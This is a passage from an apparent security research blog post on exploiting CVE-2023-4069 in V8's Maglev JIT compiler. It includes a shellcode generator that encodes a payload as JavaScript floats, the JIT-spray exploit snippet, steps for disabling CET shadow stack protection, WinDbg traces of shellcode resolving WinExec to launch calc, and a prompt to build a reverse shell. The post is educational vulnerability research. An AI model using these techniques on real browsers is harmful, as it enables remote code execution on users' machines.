</span></span><span class="line"><span class="cl"><span class="n">hex_value</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)))[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">double_value</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!d&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_value</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)))[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">values</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">double_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">js_function</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">function func() </span><span class="se">{{</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">  return [</span><span class="si">{</span><span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">values</span><span class="p">))</span><span class="si">}</span><span class="s1">];
</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="se">}}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">js_function</span><span class="p">)</span>
</span></span></code></pre></div><blockquote>
<p>Final Shellcode Generator Python script</p>
</blockquote>
<p>Once transferred on a Kali machine and installed all the pwntools
prerequisites, we can run the shellcode generator script as follows.</p>
<pre tabindex="0"><code>kali@kali:~$ python3 shellcodegen.py
function func() {
  return [1.9711307397450932e-246, 1.971182297804913e-246, 1.9711823870029425e-246, 1.971182489416965e-246, 1.9485505705182829e-246, 1.9711823520879356e-246, 1.93080727203784e-246, 1.9557721589530414e-246, 1.9560492656946336e-246, 1.9711824228538599e-246, 1.9895153914032175e-246, 1.9711823207355042e-246, 1.971182900238425e-246, -6.828932338446045e-229];
}
</code></pre><blockquote>
<p>Running the Shellcode Generator Script to Generate the JS Payload</p>
</blockquote>
<p>The resulting Windows shellcode can then be pasted into the existing
exploit to replace the Linux one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">bigIntView</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigInt64Array</span><span class="p">(</span><span class="nx">view</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">func</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">[</span><span class="mf">1.9711307397450932</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182297804913</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711823870029425</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182489416965</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9485505705182829</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711823520879356</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.93080727203784</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9557721589530414</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9560492656946336</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711824228538599</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9895153914032175</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711823207355042</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182900238425</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="o">-</span><span class="mf">6.828932338446045</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">func</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span></code></pre></div><blockquote>
<p>Inserting the New Payload in the Final Exploit</p>
</blockquote>
<p>As the latest d8 is shipped with the new <a href="https://techcommunity.microsoft.com/t5/windows-os-platform-blog/understanding-hardware-enforced-stack-protection/ba-p/1247815">Hardware-enforced Stack Protection</a>
compiler mitigation, if we run the final exploit we&rsquo;ll get an exception due to the mitigation
<a href="https://issues.chromium.org/issues/42204140">not being fully supported yet</a>.</p>
<pre tabindex="0"><code>(4fcc.5aec): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)
Subcode: 0x39 FAST_FAIL_CONTROL_INVALID_RETURN_ADDRESS Shadow stack violation
d8!Builtins_InterpreterOnStackReplacement_ToBaseline+0x9d:
00007ff6`7e96101d c3              ret
</code></pre><blockquote>
<p>Triggering Shadow Stack violation</p>
</blockquote>
<p>For this reason, in order to debug our code, we need to make sure
Intel CET mitigation is disabled for the d8 executable.</p>
<p>We can do so under the Exploit Protection settings and specifying the
exact path of our d8 location.</p>
<p><img src="../../../../img/v8/cet1.png">
<em>Specifying the Location of the d8 Executable</em></p>
<p>We then click on &lsquo;Edit&rsquo; and ovverride the default settings as
illustrated below.</p>
<p><img src="../../../../img/v8/cet2.png">
<em>Disabling Shadow Stack Mitigation for d8 Executable</em></p>
<p>As we are ready to test the full exploit, we can start the d8
process from Windbg along with the <em>&ndash;maglev</em> flag and the path of the
JavaScript exploit.</p>
<p><img src="../../../../img/v8/windbg1.png">
<em>Debugging the Final Version of the Exploit</em></p>
<p>Once we hit the initial debugger default breakpoint, we can resume
execution and hit the first shellcode instruction, that is the int3
breakpoint we placed at the very beginning.</p>
<pre tabindex="0"><code>(2eb8.155c0): Break instruction exception - code 80000003 (first chance)
ntdll!LdrpDoDebuggerBreak+0x30:
00007ff8`8eacb784 cc              int     3
0:000&gt; g
ModLoad: 00007ff8`8d770000 00007ff8`8d7a1000   C:\WINDOWS\System32\IMM32.DLL
ModLoad: 00007ff8`8c8f0000 00007ff8`8c9e3000   C:\WINDOWS\System32\shcore.dll
ModLoad: 00007ff8`8c3e0000 00007ff8`8c45a000   C:\WINDOWS\System32\bcryptPrimitives.dll
ModLoad: 00007ff8`8ae60000 00007ff8`8ae78000   C:\WINDOWS\SYSTEM32\kernel.appcore.dll
ModLoad: 00007ff8`8b530000 00007ff8`8b53c000   C:\WINDOWS\SYSTEM32\CRYPTBASE.DLL
(2eb8.155c0): Break instruction exception - code 80000003 (first chance)
00007ff6`e004d9c5 cc              int     3
</code></pre><blockquote>
<p>Hitting the First Shellcode Instruction</p>
</blockquote>
<p>We can now verify the content of the code that is going to be executed
by disassembling the next four instructions.</p>
<pre tabindex="0"><code>0:000&gt; u rip L4
00007ff6`e004d9c5 cc              int     3
00007ff6`e004d9c6 4883c360        add     rbx,60h
00007ff6`e004d9ca 90              nop
00007ff6`e004d9cb eb0c            jmp     00007ff6`e004d9d9
</code></pre><blockquote>
<p>First Shellcode Chunk</p>
</blockquote>
<p>Indeed, we can notice they resemble the first part of the shellcode from the Python
code. Additionally, we can observe that the script has filled the
blanks with a <em>nop</em> instruction and correctly inserted the short jump
<em>eb0c</em>, which transfers execution to the second chunk.</p>
<p>If we keep stepping into the functon, we reach a point where we obtain
the <em>PebLdr</em> and the <em>InMemoryOrderModuleList</em> linked list.</p>
<pre tabindex="0"><code>...
0:000&gt; t
...
00007ff6`e004d9ed 498b7818        mov     rdi,qword ptr [r8+18h] ds:0000003e`34b74018={ntdll!PebLdr (00007ff8`8eb763e0)}
0:000&gt; 
00007ff6`e004d9f1 90              nop
0:000&gt; 
00007ff6`e004d9f2 90              nop
0:000&gt; 
00007ff6`e004d9f3 eb0c            jmp     00007ff6`e004da01
0:000&gt; 
00007ff6`e004da01 488b7f30        mov     rdi,qword ptr [rdi+30h] ds:00007ff8`8eb76410=000001ef35132870
0:000&gt; t
00007ff6`e004da05 90              nop
0:000&gt; 
00007ff6`e004da06 90              nop
0:000&gt; 
00007ff6`e004da07 eb0c            jmp     00007ff6`e004da15
0:000&gt; 
00007ff6`e004da15 488b3f          mov     rdi,qword ptr [rdi] ds:000001ef`35132870=000001ef35137ee0
0:000&gt; 
00007ff6`e004da18 488b3f          mov     rdi,qword ptr [rdi] ds:000001ef`35137ee0=000001ef35137930
0:000&gt; 
00007ff6`e004da1b eb0c            jmp     00007ff6`e004da29
0:000&gt; 
00007ff6`e004da29 488b4710        mov     rax,qword ptr [rdi+10h] ds:000001ef`35137940={KERNEL32!Module32NextW &lt;PERF&gt; (KERNEL32+0x0) (00007ff8`8e040000)}
0:000&gt; dq rdi 
000001ef`35137930  000001ef`35139e70 000001ef`35137ee0
000001ef`35137940  00007ff8`8e040000 00007ff8`8e0525e0
0:000&gt; lm m kernel32
Browse full module list
start             end                 module name
00007ff8`8e040000 00007ff8`8e104000   KERNEL32   (pdb symbols)          C:\ProgramData\Dbg\sym\kernel32.pdb\ECF8474815CE300AEB3AD59F5913B35B1\kernel32.pdb
</code></pre><blockquote>
<p>Verifying the KERNEL32 Base Address</p>
</blockquote>
<p>After walking the linked list twice, we can dereference and save into
RAX the value at offset 0x10 from RDI, that is the base address of
KERNEL32.</p>
<p>From that, we then add the static offset in order to gather WinExec
memory address.</p>
<pre tabindex="0"><code>00007ff6`e004da2d 90              nop
0:000&gt; 
00007ff6`e004da2e 90              nop
0:000&gt; 
00007ff6`e004da2f eb0c            jmp     00007ff6`e004da3d
0:000&gt; 
00007ff6`e004da3d 4805c0860600    add     rax,686C0h
0:000&gt; 
00007ff6`e004da43 eb0c            jmp     00007ff6`e004da51
0:000&gt; u rax
KERNEL32!WinExec:
00007ff8`8e0a86c0 488bc4          mov     rax,rsp
00007ff8`8e0a86c3 48895810        mov     qword ptr [rax+10h],rbx
00007ff8`8e0a86c7 48897018        mov     qword ptr [rax+18h],rsi
00007ff8`8e0a86cb 48897820        mov     qword ptr [rax+20h],rdi
00007ff8`8e0a86cf 55              push    rbp
00007ff8`8e0a86d0 488d68c8        lea     rbp,[rax-38h]
00007ff8`8e0a86d4 4881ec30010000  sub     rsp,130h
00007ff8`8e0a86db 488b050e0b0500  mov     rax,qword ptr [KERNEL32!_security_cookie (00007ff8`8e0f91f0)]
</code></pre><blockquote>
<p>Verifying the KERNEL32 Base Address</p>
</blockquote>
<p>Once the offset has been added to RAX, we can verify that the resolved
address matches the WinExec function.</p>
<blockquote>
<p><strong>NOTE: Using static offsets to resolve functions is not recommended
because offsets might change in future releases or even patch
versions. While this approach has been taken for the sake of
conciseness, readers are encouraged to upgrade the existing shellcode
to a version-independent one.</strong></p>
</blockquote>
<p>Moving on, we can inspect how the string for the first WinExec
argument is stored into RCX.</p>
<pre tabindex="0"><code>0:000&gt; t
00007ff6`e004da51 682e657865      push    6578652Eh
0:000&gt; 
00007ff6`e004da56 59              pop     rcx
0:000&gt; 
00007ff6`e004da57 eb0c            jmp     00007ff6`e004da65
0:000&gt; 
00007ff6`e004da65 6863616c63      push    636C6163h
0:000&gt; 
00007ff6`e004da6a 5a              pop     rdx
0:000&gt; 
00007ff6`e004da6b eb0c            jmp     00007ff6`e004da79
0:000&gt; 
00007ff6`e004da79 48c1e120        shl     rcx,20h
0:000&gt; 
00007ff6`e004da7d 90              nop
0:000&gt; .formats rcx
Evaluate expression:
  Hex:     00000000`00000000
  Decimal: 0
  Decimal (unsigned) : 0
  Octal:   0000000000000000000000
  Binary:  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
  Chars:   ........
  Time:    unavailable
  Float:   low 0 high 0
  Double:  0
</code></pre><blockquote>
<p>Inspecting the high 32-bit of the first WinExec argument</p>
</blockquote>
<p>Once the first 32-bit part of the string is popped into RCX (all zeroes) it is then
shiftet 0x32 bit to the left.
We can verify the characters value in RCS with the <em>.formats rcx</em> command.</p>
<pre tabindex="0"><code>0:000&gt; t
00007ff6`e004da7e 90              nop
0:000&gt; 
00007ff6`e004da7f eb0c            jmp     00007ff6`e004da8d
0:000&gt; 
00007ff6`e004da8d 4801d1          add     rcx,rdx
0:000&gt; 
00007ff6`e004da90 4831d2          xor     rdx,rdx
0:000&gt; .formats rcx
Evaluate expression:
  Hex:     00000000`636c6163
  Decimal: 1668047203
  Decimal (unsigned) : 1668047203
  Octal:   0000000000014333060543
  Binary:  00000000 00000000 00000000 00000000 01100011 01101100 01100001 01100011
  Chars:   ....clac
  Time:    Thu Nov 10 03:26:43 2022
  Float:   low 4.36045e+021 high 0
  Double:  8.24125e-315
</code></pre><blockquote>
<p>Inspecting the low 32-bit of the first WinExec argument</p>
</blockquote>
<p>The entire string is now completed by adding the second 32-bit from
RDX to RCX and we can notice the &ldquo;calc&rdquo; string in reverse order.</p>
<p>Now we have to push the string onto the stack, and then we move the
stack pointer address back to RCX, so that RCX will store a string
pointer. After that we then set RDX to 1.</p>
<pre tabindex="0"><code>0:000&gt; t
00007ff6`e004daa1 51              push    rcx
...
0:000&gt; 
00007ff6`e004daa7 eb0c            jmp     00007ff6`e004dab5
0:000&gt; 
00007ff6`e004dab5 4889e1          mov     rcx,rsp
...
0:000&gt; 
00007ff6`e004dabb eb0c            jmp     00007ff6`e004dac9
...
0:000&gt; 
00007ff6`e004dac9 48ffc2          inc     rdx
</code></pre><blockquote>
<p>Storing the string pointer into RCX and setting RDX to 1</p>
</blockquote>
<p>We are now ready to call WinExec and step into it to verify the two function
arguments.</p>
<pre tabindex="0"><code>0:000&gt; 
00007ff6`e004dacc ffd0            call    rax {KERNEL32!WinExec (00007ff8`8e0a86c0)}
0:000&gt; t
Breakpoint 0 hit
KERNEL32!WinExec:
00007ff8`8e0a86c0 488bc4          mov     rax,rsp
0:000&gt; db rcx L8
00000012`fb9fea50  63 61 6c 63 00 00 00 00                          calc....
0:000&gt; r rdx
rdx=0000000000000001
</code></pre><blockquote>
<p>Calling WinExec</p>
</blockquote>
<p>The memory address contained in RCX corresponds to the string
pointer stored previously, while RDX holds the expected value of <em>1</em>.
Proceeding with the execution, a sleek calculator window appears,
indicating that we successfully executed the shellcode.</p>
<p><img src="../../../../img/v8/windbg3.png">
<em>Launching Calculator</em></p>
<p>It&rsquo;s also important to note that even though we used our JIT spraying
method, the process terminated without problems. However, this might
not always happen, as it depends on how the V8 heap memory is set up
and if its data is intact.</p>
<p>We managed to execute arbitrary code on the system because the d8
process is meant to run with the same processes and privileges of the
shell it is executed from. This is by design, as d8 is a debugging
environment. Running the same exploit on the affected Chrome version
would result in failure, as the Chrome sandbox would block such an API
call.</p>
<p>In real world scenario, exploits like the one we discussed in this
blog post require an additional sandbox-escape exploit that needs to
be chained to the first one.</p>
<h2 id="addendum-version-independent-shellcode">Addendum: Version Independent Shellcode</h2>
<p>As I wasn&rsquo;t fully satisfied with having a shellcode that was version-specific, I decided to go the extra mile and rewrite the WinExec shellcode to make it version-independent for demonstration purposes.</p>
<p>This shellcoding technique is fairly well-known and revolves around dynamically resolving function addresses. Here&rsquo;s a short overview:</p>
<ol>
<li>
<p><strong>Locating Kernel32.dll</strong>:
The shellcode first finds the base address of kernel32.dll, which contains many essential Windows functions, including WinExec. This is done by referencing the Process Environment Block (PEB), as we did before.</p>
</li>
<li>
<p><strong>Export Directory Table</strong>:
To find function addresses, the shellcode uses the Export Directory Table of kernel32.dll. This table includes:</p>
<ul>
<li>Number of exported symbols</li>
<li>RVA (Relative Virtual Address) of function addresses array</li>
<li>RVA of function names array</li>
<li>RVA of function ordinals array</li>
</ul>
</li>
<li>
<p><strong>Resolving Functions</strong>:</p>
<ul>
<li>Search the function name in the export-names array.</li>
<li>Find the corresponding ordinal in the export-ordinals array.</li>
<li>Use the ordinal to get the function&rsquo;s RVA from the export-functions array.</li>
<li>Convert the RVA to a full address by adding the base address of kernel32.dll.</li>
</ul>
</li>
<li>
<p><strong>Hashing Function Names</strong>:
The technique uses a hashing function to convert function names into 4-byte hashes, making the shellcode more efficient and smaller.</p>
</li>
<li>
<p><strong>Loading Additional Modules (optional)</strong>:
After resolving <code>LoadLibraryA</code>, the shellcode can load other modules and resolve more functions, enabling it to execute a wide range of tasks.</p>
</li>
</ol>
<p>As this shellcode approach was fairly trivial, its implementation wasn&rsquo;t that much. It appears that JIT&rsquo;ed function code is not compiled equally, and some extra instructions have been introduced after about one third of the shellcode size. This uneven distance between floating-point encoded shellcode pieces required two different jumps: <code>jmp 0xe</code> for the shorter gap and <code>jmp 0x11</code> for the larger one.</p>
<p>The rest of the shellcode is pretty much an adaptation of the original method, apart from control flow and branching. Since the shellcode is spread out in memory in different blocks, I had to manually rewrite all the conditional jumps and call instructions that were otherwise fine in a plain and linear shellcode.</p>
<p>As we now have a way to dynamically resolve functions, the reader is challenged to implement a full reverse shell that can be spawned from the d8 process.</p>
<p>The code for the exploit and version-specific and universal shellcodes can be found in <a href="https://github.com/uf0o/exploit_dev/tree/main/browsers/v8/CVE-2023-4069">this repository</a>.</p>
<h2 id="conclusions">Conclusions</h2>
<p>We&rsquo;ve covered a lot of ground in this blog post, exploring various
topics like the Chromium Security Architecture and the V8 Pipeline,
with a focus on the Maglev Compiler. We also talked about the root
cause analysis of CVE-2023-4069 and how to exploit it with
JIT-spraying shellcode.</p>
<p>Thank you for sticking with it! I hope you found some of the insights
helpful. If you spot any errors or have additional information, please
don&rsquo;t hesitate to reach out. Your feedback is always welcome!</p>
<h2 id="external-references">External References</h2>
<ul>
<li><a href="https://www.chromium.org/Home/chromium-security/guts/">Chromium Security Architecture</a></li>
<li><a href="https://v8.dev/">V8 Official Documentation</a></li>
<li><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Wikipedia - Abstract Syntax Tree</a></li>
<li><a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">Wikipedia - JIT Compilation</a></li>
<li><a href="https://blog.chromium.org/2010/12/new-crankshaft-for-v8.html">Chromium Blog - New Crankshaft for V8</a></li>
<li><a href="https://v8.dev/docs/turbofan">V8 Official Documentation - TurboFan</a></li>
<li><a href="https://v8.dev/docs/ignition">V8 Official Documentation - Ignition</a></li>
<li><a href="https://benediktmeurer.de/2017/03/01/v8-behind-the-scenes-february-edition">Benedikt Meurer - Introduction to TurboFan</a></li>
<li><a href="https://v8.dev/docs/hidden-classes">V8 Official Documentation - Hidden Classes</a></li>
<li><a href="https://v8.dev/blog/maglev">V8 Official Documentation - Maglev</a></li>
<li><a href="https://github.com/v8/v8">V8 GitHub Repository</a></li>
<li><a href="https://github.blog/2023-10-17-getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/">GitHub Security Lab Blog</a></li>
<li><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/">Google Docs - V8 Sandbox Design</a></li>
<li><a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">Faraz Haider - V8 Internals: JIT Spraying</a></li>
<li><a href="https://v8.dev/docs/wasm-compilation-pipeline">V8 Official Documentation - WASM</a></li>
<li><a href="https://techcommunity.microsoft.com/t5/windows-os-platform-blog/understanding-hardware-enforced-stack-protection/ba-p/1247815">Microsoft Tech Community - Understanding Hardware-enforced Stack Protection</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">Microsoft Documentation - PEB Structure</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">Microsoft Documentation - WinExec</a></li>
<li><a href="https://jhalon.github.io/chrome-browser-exploitation-1/">Jack Halon - V8 Exploitation Series</a></li>
<li><a href="https://doar-e.github.io/tag/v8.html">Jeremy Fativeau - V8 Series</a></li>
</ul>
<p><a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev.html#top">Back to Top</a></p>
            </div>
        </article>
        <hr />
        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="../../../../tags/v8.html">v8</a></span><span class="tag"><a href="../../../../tags/exploitation.html">exploitation</a></span><span class="tag"><a href="../../../../tags/maglev.html">maglev</a></span><span class="tag"><a href="../../../../tags/chrome.html">chrome</a></span>
                </p>
        </div>
    </main>
            </div>
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span style="font-size: 14px;">&copy; 2024</span>
            <span>
                <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" title="This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.">
                    License
                </a>
            </span>
            <span>
                    <a href="../../../../index.xml" target="_blank" title="rss">
                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss">
                            <path d="M4 11a9 9 0 0 1 9 9"></path>
                            <path d="M4 4a16 16 0 0 1 16 16"></path>
                            <circle cx="5" cy="19" r="1"></circle>
                        </svg>
                    </a>
            </span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>
                <h5>Illustrations by &nbsp;<a target="_blank" href="https://instagram.com/sergio_kalisiak">Sergio Kalisiak</a></h5>
            </span>
        </div>
    </div>
</footer>
        </div>
<script type="text/javascript" src="../../../../bundle.min.8750240a1a2b5e2e02df200915140d47eadf74d9f9510dfe046bef237f486c4542dca2cd6c82d7241a01a6baf1e05afaf2385d481144ad18c0251d56db724273.js" ></script>
    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'G-18TCRTW8CL', 'auto');
        ga('send', 'pageview');
    </script>
    </body>
</html>
